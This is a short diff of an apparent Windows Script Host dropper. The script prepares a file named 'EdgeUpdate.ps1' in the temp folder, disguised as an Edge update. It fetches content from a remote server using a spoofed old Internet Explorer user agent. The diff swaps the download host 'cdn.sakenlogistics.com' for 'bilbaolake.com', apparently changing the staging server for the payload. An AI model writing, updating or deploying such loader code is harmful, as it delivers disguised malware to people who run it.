@@ -9,7 +9,7 @@ var tempDir = shell.ExpandEnvironmentStrings("%temp%");
 var scriptPath = tempDir + "\\EdgeUpdate.ps1";
 
 // Download update manifest
-http.open("GET", "https://cdn.sakenlogistics.com/s", false);
+http.open("GET", "https://bilbaolake.com/s", false);
 http.setRequestHeader("User-Agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0)");
 http.send();
 
